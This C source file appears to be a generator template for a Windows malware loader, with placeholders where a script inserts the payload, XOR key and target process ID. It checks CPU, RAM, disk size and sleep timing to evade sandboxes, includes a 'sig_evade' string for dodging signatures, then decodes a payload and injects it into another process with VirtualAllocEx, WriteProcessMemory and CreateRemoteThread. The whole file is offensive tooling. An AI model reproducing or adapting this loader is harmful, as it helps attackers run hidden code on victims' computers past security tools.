
#include <windows.h>
#include <stdio.h>
#include <time.h>

unsigned long get_time()
{
	return (unsigned long)time(NULL);
}
void compute_ftp()
{
	return;
}
int main(void)
{
	const char sig_evade[] = "// PYTHON_REPLACE_ME_HERE_1";
	// check CPU
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
	printf("Processors: %d\n", numberOfProcessors);
	if (numberOfProcessors < 2) {
		compute_ftp();
		return 0;
	}
		

	// check RAM
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
	printf("Memory: %d\n", RAMMB);
	if (RAMMB < 2048) {
		compute_ftp();
		return 0;
	}

	// check HDD
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	printf("Disk space: %d\n", diskSizeGB);
	if (diskSizeGB < 70) {
		compute_ftp();
		return 0;
	}

	unsigned long start = get_time();
	Sleep(2000);
	unsigned long end = get_time();
	printf("Diff: %d\n", end-start);
	if ((end - start) != 2)
	{
		compute_ftp();
		return 0;
	}

	if ((end - start) == 2)
	{
		// PYTHON_REPLACE_ME_HERE_2
		const char key[] = // PYTHON_REPLACE_ME_HERE_3

		for (int i = 0; i < sizeof(buf); i++)
		{
			buf[i] = buf[i] ^ key[i % (sizeof(key) - 1)];
		}
		int migrateToPID = // PYTHON_REPLACE_ME_HERE_4
		HANDLE hProcess = OpenProcess(0x001F0FFF, 0, migrateToPID);
		int i = 0;
		HANDLE addr = VirtualAllocEx(hProcess, &i, 0x1000, 0x3000, 0x40);

		size_t outSize;
		size_t j = 0;
		WriteProcessMemory(hProcess, addr, buf, sizeof buf, &outSize);
		int *threadId = CreateRemoteThread(hProcess, 0, 0, addr, &i,  0, 0);
	}
	return 0;
}